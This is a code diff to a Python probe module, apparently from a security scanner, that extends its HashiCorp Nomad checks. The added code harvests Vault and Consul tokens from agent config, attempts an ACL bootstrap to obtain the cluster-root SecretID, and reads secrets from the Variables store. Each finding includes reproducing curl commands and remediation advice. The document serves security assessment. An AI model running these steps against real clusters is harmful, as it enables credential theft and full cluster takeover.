@@ -25,6 +25,7 @@ from __future__ import annotations
 import http.client
 import json
 import ssl
+from urllib.parse import quote
 
 from ..core.models import Host, Port
 
@@ -32,6 +33,7 @@ from ..core.models import Host, Port
 _DEFAULT_PORT = 4646
 _TIMEOUT = 3.0
 _UA = "recce-probe/1.0"
+_VARS_MAX = 40
 
 
 def is_nomad(port: Port) -> bool:
@@ -42,8 +44,11 @@ def is_nomad(port: Port) -> bool:
 
 
 def _http(ip: str, port: int, method: str, path: str,
-          timeout: float = _TIMEOUT) -> tuple[int, bytes] | None:
+          timeout: float = _TIMEOUT, token: str = "") -> tuple[int, bytes] | None:
     """One request. Transparently retries HTTPS if plain HTTP is rejected."""
+    headers = {"User-Agent": _UA, "Connection": "close"}
+    if token:
+        headers["X-Nomad-Token"] = token
     for use_tls in (False, True):
         conn = None
         try:
@@ -52,8 +57,7 @@ def _http(ip: str, port: int, method: str, path: str,
                 conn = http.client.HTTPSConnection(ip, port, timeout=timeout, context=ctx)
             else:
                 conn = http.client.HTTPConnection(ip, port, timeout=timeout)
-            conn.request(method, path,
-                         headers={"User-Agent": _UA, "Connection": "close"})
+            conn.request(method, path, headers=headers)
             resp = conn.getresponse()
             return resp.status, resp.read(500_000)
         except (OSError, http.client.HTTPException, ssl.SSLError, ValueError):
@@ -67,23 +71,103 @@ def _http(ip: str, port: int, method: str, path: str,
     return None
 
 
-def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT) -> dict:
-    """Return {reachable, version, acl_enabled, jobs, allocations, nodes}."""
-    out = {"reachable": False, "version": "", "acl_enabled": None,
-           "jobs": [], "allocations": 0, "nodes": 0, "leader": ""}
+def _extract_integration_tokens(config: dict) -> tuple[dict, dict]:
+    """Pull Vault{Address,Token,Namespace} and Consul{Address,Token} from agent/self.config."""
+    vault_out: dict = {}
+    consul_out: dict = {}
+    vault = config.get("Vault") or {}
+    vtoken = str(vault.get("Token") or "")
+    if vtoken:
+        vault_out = {
+            "address": str(vault.get("Address") or "")[:200],
+            "token": vtoken[:120],
+            "namespace": str(vault.get("Namespace") or "")[:80],
+        }
+    consul = config.get("Consul") or {}
+    ctoken = str(consul.get("Token") or "")
+    if ctoken:
+        consul_out = {
+            "address": str(consul.get("Address") or "")[:200],
+            "token": ctoken[:120],
+        }
+    return vault_out, consul_out
 
-    r = _http(ip, port, "GET", "/v1/agent/self", timeout=timeout)
+
+def _try_acl_bootstrap(ip: str, port: int, timeout: float) -> str:
+    """POST /v1/acl/bootstrap. Returns the SecretID iff the cluster was un-bootstrapped."""
+    r = _http(ip, port, "POST", "/v1/acl/bootstrap", timeout=timeout)
+    if r is None or r[0] != 200:
+        return ""
+    try:
+        j = json.loads(r[1].decode("utf-8", "replace"))
+    except (ValueError, UnicodeDecodeError):
+        return ""
+    if not isinstance(j, dict):
+        return ""
+    return str(j.get("SecretID") or "")[:120]
+
+
+def _enumerate_variables(ip: str, port: int, timeout: float,
+                         token: str = "") -> list[dict]:
+    """List /v1/vars and pull /v1/var/:path for each item (capped)."""
+    r = _http(ip, port, "GET", "/v1/vars", timeout=timeout, token=token)
+    if r is None or r[0] != 200:
+        return []
+    try:
+        meta = json.loads(r[1].decode("utf-8", "replace"))
+    except (ValueError, UnicodeDecodeError):
+        return []
+    if not isinstance(meta, list):
+        return []
+    out: list[dict] = []
+    for m in meta[:_VARS_MAX]:
+        if not isinstance(m, dict):
+            continue
+        path = str(m.get("Path") or "")
+        ns = str(m.get("Namespace") or "default")
+        if not path:
+            continue
+        r2 = _http(ip, port, "GET",
+                   f"/v1/var/{quote(path, safe='/')}?namespace={quote(ns, safe='')}",
+                   timeout=timeout, token=token)
+        entry: dict = {"path": path[:200], "namespace": ns[:60],
+                       "keys": [], "values_readable": False}
+        if r2 is not None and r2[0] == 200:
+            try:
+                v = json.loads(r2[1].decode("utf-8", "replace"))
+                items = (v or {}).get("Items") or {}
+                if isinstance(items, dict) and items:
+                    entry["keys"] = [str(k)[:80] for k in list(items.keys())[:20]]
+                    entry["values_readable"] = True
+            except (ValueError, UnicodeDecodeError):
+                pass
+        out.append(entry)
+    return out
+
+
+def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT,
+          token: str = "") -> dict:
+    """Return {reachable, version, acl_enabled, jobs, allocations, nodes, ...}."""
+    out: dict = {"reachable": False, "version": "", "acl_enabled": None,
+                 "jobs": [], "allocations": 0, "nodes": 0, "leader": "",
+                 "vault": {}, "consul": {}, "vars": [], "acl_bootstrap_token": ""}
+
+    r = _http(ip, port, "GET", "/v1/agent/self", timeout=timeout, token=token)
     if r is None:
         return out
     status, body = r
     if status != 200:
         # /v1/status/leader is anonymous even under ACL enforcement
-        r2 = _http(ip, port, "GET", "/v1/status/leader", timeout=timeout)
+        r2 = _http(ip, port, "GET", "/v1/status/leader", timeout=timeout, token=token)
         if r2 is None or r2[0] != 200:
             return out
         out["reachable"] = True
         out["leader"] = r2[1].decode("utf-8", "replace").strip().strip('"')[:80]
         out["acl_enabled"] = True
+        # Reads gated -> attempt the one-shot bootstrap that only succeeds when
+        # ACLs are enabled but never bootstrapped.
+        if not token:
+            out["acl_bootstrap_token"] = _try_acl_bootstrap(ip, port, timeout)
         return out
     out["reachable"] = True
     try:
@@ -92,10 +176,13 @@ def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT) -> dict
         out["version"] = str(config.get("Version") or j.get("member", {}).get("Tags", {}).get("build") or "")[:60]
         acl = (config.get("ACL") or {}).get("Enabled")
         out["acl_enabled"] = bool(acl)
+        vault_cfg, consul_cfg = _extract_integration_tokens(config)
+        out["vault"] = vault_cfg
+        out["consul"] = consul_cfg
     except (ValueError, UnicodeDecodeError):
         pass
 
-    r = _http(ip, port, "GET", "/v1/jobs", timeout=timeout)
+    r = _http(ip, port, "GET", "/v1/jobs", timeout=timeout, token=token)
     if r is not None and r[0] == 200:
         try:
             jobs = json.loads(r[1].decode("utf-8", "replace"))
@@ -107,7 +194,7 @@ def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT) -> dict
         except (ValueError, UnicodeDecodeError):
             pass
 
-    r = _http(ip, port, "GET", "/v1/allocations", timeout=timeout)
+    r = _http(ip, port, "GET", "/v1/allocations", timeout=timeout, token=token)
     if r is not None and r[0] == 200:
         try:
             allocs = json.loads(r[1].decode("utf-8", "replace"))
@@ -115,13 +202,15 @@ def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT) -> dict
         except (ValueError, UnicodeDecodeError):
             pass
 
-    r = _http(ip, port, "GET", "/v1/nodes", timeout=timeout)
+    r = _http(ip, port, "GET", "/v1/nodes", timeout=timeout, token=token)
     if r is not None and r[0] == 200:
         try:
             nodes = json.loads(r[1].decode("utf-8", "replace"))
             out["nodes"] = len(nodes) if isinstance(nodes, list) else 0
         except (ValueError, UnicodeDecodeError):
             pass
+
+    out["vars"] = _enumerate_variables(ip, port, timeout, token=token)
 
     return out
 
@@ -179,6 +268,67 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"curl http://{h.ip}:{p.portid}/v1/status/leader",
                     "Ensure ACLs stay enforcing; rotate compromised tokens promptly.",
                     [], kind="nomad_authed"))
+
+            if pr.get("acl_bootstrap_token"):
+                sid = pr["acl_bootstrap_token"]
+                shown = sid[:8] + "…" if len(sid) > 8 else sid
+                out.append(_finding(
+                    "critical",
+                    "Nomad ACL system un-bootstrapped — cluster-root token obtained", tgt,
+                    f"POST /v1/acl/bootstrap succeeded: ACLs were enabled but never "
+                    f"initialized, so the API handed over the initial management "
+                    f"SecretID (…{shown}). This token has cluster-god rights: read "
+                    f"every job spec, submit jobs, exec into any allocation, read "
+                    f"Variables, and rotate ACL policies.",
+                    f"curl -sk -X POST http://{h.ip}:{p.portid}/v1/acl/bootstrap",
+                    "Bootstrap ACLs immediately from a trusted host and store the "
+                    "resulting management token in a secret manager; do not leave "
+                    "acl.enabled=true on a fresh cluster unattended.",
+                    ["CWE-306", "CWE-1188"], kind="nomad_acl_bootstrap_available"))
+
+            vault_cfg = pr.get("vault") or {}
+            consul_cfg = pr.get("consul") or {}
+            if vault_cfg.get("token") or consul_cfg.get("token"):
+                parts = []
+                if vault_cfg.get("token"):
+                    vt = vault_cfg["token"]
+                    parts.append(f"Vault token (…{vt[-6:]}) for {vault_cfg.get('address') or '?'}"
+                                 + (f" ns={vault_cfg['namespace']}" if vault_cfg.get("namespace") else ""))
+                if consul_cfg.get("token"):
+                    ct = consul_cfg["token"]
+                    parts.append(f"Consul token (…{ct[-6:]}) for {consul_cfg.get('address') or '?'}")
+                out.append(_finding(
+                    "critical",
+                    "Nomad agent/self leaks Vault/Consul integration tokens", tgt,
+                    f"Nomad {pr.get('version','?')} /v1/agent/self returned the "
+                    f"cluster's integration credentials in cleartext: "
+                    + "; ".join(parts) + ". These are the exact tokens Nomad uses "
+                    "to talk to Vault and Consul on the operator's behalf — reusable "
+                    "against those endpoints directly.",
+                    f"curl -sk http://{h.ip}:{p.portid}/v1/agent/self | jq .config.Vault,.config.Consul",
+                    "Do not embed static tokens in the Nomad agent config; use "
+                    "Vault agent auto-auth / Consul auto-encrypt and gate /v1/agent/self "
+                    "behind an ACL policy that requires management scope.",
+                    ["CWE-522", "CWE-200"], kind="nomad_integration_token_leak"))
+
+            variables = pr.get("vars") or []
+            readable = [v for v in variables if v.get("values_readable")]
+            if variables:
+                sample = ", ".join(v["path"] for v in variables[:6]) or "-"
+                extra = "" if len(variables) <= 6 else f" (+{len(variables) - 6} more)"
+                sev = "critical" if readable else "high"
+                out.append(_finding(
+                    sev,
+                    "Nomad Variables secret store readable", tgt,
+                    f"GET /v1/vars returned {len(variables)} variable path(s); "
+                    f"{len(readable)} yielded cleartext Items on GET /v1/var/:path. "
+                    f"Nomad Variables is the built-in secret store — DB URIs, cloud "
+                    f"credentials, and template inputs typically live here. "
+                    f"Paths: {sample}{extra}.",
+                    f"curl -sk http://{h.ip}:{p.portid}/v1/vars",
+                    "Scope the `anonymous` ACL policy to deny variables.read; grant "
+                    "per-path variables policies only to the jobs that need them.",
+                    ["CWE-200", "CWE-522"], kind="nomad_variables_readable"))
     return out
 
 
